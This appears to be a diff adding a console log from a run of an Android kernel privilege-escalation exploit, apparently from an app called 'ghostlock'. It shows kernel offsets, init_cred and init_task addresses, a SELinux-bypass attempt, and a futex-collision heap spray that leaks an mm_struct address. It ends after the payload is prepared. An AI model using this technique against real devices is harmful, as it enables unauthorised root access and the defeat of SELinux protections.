@@ -1,0 +1,30 @@
+[33m[*] [0mcpu pair: main=3 consumer=4
+[33m[*] [0mruntime home=/data/user/0/com.ghostlock.app/files script=/data/user/0/com.ghostlock.app/files/.ghostlock_root.sh
+[33m[*] [0mkernel: 5.15.189-android13-8-00016-g51bba4309aac-ab14546557
+[33m[*] [0mno external offsets match at /data/user/0/com.ghostlock.app/files/offsets.json
+[32m[+] [0moffsets matched: 5.15.189-android13-8-00016-g51bba4309aac-ab14546557
+[33m[*] [0msoc: qcom/other; kernel_phys_load=0xa8000000
+[33m[*] [0minit_cred image=ffffffc082bfd588 alias=ffffff802abfd588
+[32m[+] [0mstartup context pid=16103 uid=10506 euid=10506 gid=10506 egid=10506 attr=u:r:runas_app:s0:c250,c257,c512,c768 enforce=unreadable
+[32m[+] [0mstartup limits pid=16103 NoNewPrivs=0 Seccomp=0 Seccomp_filters=0
+[32m[+] [0mbuild config pid=16103 label=ghostlock_oplus slide=pselect main=pselect
+[32m[+] [0mp0 profile pid=16103 phys_offset=0000000080000000 kernel_phys_load=00000000a8000000 delta=0000000028000000 slide_logger=ffffff802ab01e28 bootid_data=ffffff802adc6819 init_task=ffffff802ac43400 root_tg=ffffff802ad58ac0 sysctl_bootid=ffffff802adc6819
+[33m[*] [0mp0 kernel_phys_load=00000000a8000000 delta=0000000028000000
+[33m[*] [0mmain thread running on cpu=3
+[33m[*] [0m[T+0ms] exploit start
+[31m[-] [0mSELinux enforce unreadable; assuming enforcing and running W1
+[33m[*] [0m[T+0ms] pre-W1 drain
+[33m[*] [0mW1: SELinux attempt 1/15
+[33m[*] [0m=== W1: SELinux === target=0xffffff802adaad88 mode=1 leaf=0
+[33m[*] [0m[T+166ms]   heap spray start
+[33m[*] [0m[spray] mm spray + kernelsnitch ready (cpu=8) +194ms
+[33m[*] [0m[spray] finding futex collisions... +387ms
+[33m[*] [0m[spray]   still finding collisions (2s) 34% (futex 0xb2a7538/0x1000000000)...
+[33m[*] [0m[spray]   still finding collisions (4s) 70% (futex 0x166fc7e0/0x1000000000)...
+[33m[*] [0m[spray]   still finding collisions (6s) 99% (futex 0x1ffffff8/0x1000000000)...
+[33m[*] [0m[spray] futex collisions found +6511ms
+[33m[*] [0m[spray] mm_struct leaked=0xffffff894f449c00 +8126ms
+[33m[*] [0m[spray] payload ready +8128ms
+[33m[*] [0mprepare_kernel_page ok attempt=1 +8238ms
+[33m[*] [0m[T+8405ms]   heap spray done
+[33m[*] [0mconsumer thread running on cpu=4
